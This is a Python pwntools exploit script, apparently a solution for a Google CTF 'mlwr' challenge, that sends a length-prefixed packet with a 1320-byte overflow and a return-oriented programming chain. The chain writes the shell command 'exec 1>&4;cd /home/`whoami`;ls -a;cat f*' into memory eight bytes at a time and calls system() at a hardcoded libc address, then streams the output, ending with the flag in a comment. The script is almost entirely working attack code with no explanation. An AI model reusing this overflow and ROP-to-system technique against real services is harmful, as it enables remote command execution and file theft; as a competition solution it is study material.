#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

key = randoms(8)

def checksum(data):
    s = 0
    for c in data:
        s ^= ord(c)
    return s

def Send(data):
    p = p32(len(data) + 10)
    p += key
    p += data + "\x00"
    p += chr(checksum(key + data))
    r.send(p)

def Recv():
    size = u32(r.recv(4))
    data = r.recv(size)[8:]
    return data[:-1]

if args.REMOTE:
    r = remote("35.233.98.21", 4242)
else:
    r = remote("mlwr-part1.ctfcompetition.com", 1234)

data = "A" * 1320 + "\0"

context.log_level = 'debug'

#  print(sys.argv[1])
p = p32(8) + key + data
p += '\x00' * 7
#  p += p64(0x404166) * 8
p += p64(0) * 3
# 0x40a101 : pop rax ; pop rcx ; pop rdx ; pop rsi ; pop rdi ; call rax
# 0x0000000000408108 : pop rax ; ret
# 0x0000000000400b18 : pop rbp ; ret
# 0x00000000004093e1 : mov qword ptr [rbp - 0x10], rax ; mov rax, qword ptr [rbp - 0x10] ; shr rax, 0x20 ; xor eax, dword ptr [rbp - 4] ; pop rbp ; ret
#  0x400A81, # rax = send
pop_rax = 0x408108
pop_rbp = 0x400b18
pop_rdi = 0x000000000040aeb3
pop_rsi_15 = 0x000000000040aeb1
set_b = 0x4093e1
buf = 0x60c800
get = 0x4097fa
dynamic = 0x40a0e7
libc_base = 0x7f1b8014f630 - 0x20630
system = libc_base + 0x41100
p += flat(
    pop_rax, "exec 1>&", pop_rbp, buf+0x10, set_b, buf + 0x10 + 8,
    pop_rax, "4;cd /ho", set_b, buf + 0x10 + 8 * 2,
    pop_rax, "me/`whoa", set_b, buf + 0x10 + 8 * 3,
    pop_rax, "mi`;ls -", set_b, buf + 0x10 + 8 * 4,
    pop_rax, "a;cat f*", set_b, buf + 0x10 + 8 * 5,
    pop_rdi, buf,
    system
)
#  p += flat(
    #  pop_rax,
    #  "system\x00\x00",
    #  pop_rbp,
    #  buf + 0x10,
    #  set_b, buf+8+0x10, # next rbp
    #  pop_rax,
    #  "ls 1>&4".ljust(8, "\x00"),
    #  set_b, 0,
    #  pop_rdi, buf,
    #  pop_rsi_15, buf + 8, 0,
    #  pop_rax, 0,
    #  pop_rdi, 0x7f1b8021ce30,
    #  pop_rsi_15, buf, 0,
    #  #  get,
    #  #  0x000000000040a105, # pop rdi ; call rax
    #  #  buf + 8,
    #  #  dynamic,
    #  0x40a101,
    #  0x400a81,
    #  0, 0x100, buf, 4,
#  )
# + p64(0x60c300) + p64(0x408e91)
p += ('\x00' + '\x00' * 7) * (0x3200 / 8)

#  p += chr(int(sys.argv[1]))
# p += chr(checksum(key + data))

r.send(p)
r.shutdown()

r.stream() # interactive()
# CTF{~~~APT warz: teh 3mpire pwns b4ck~~~}
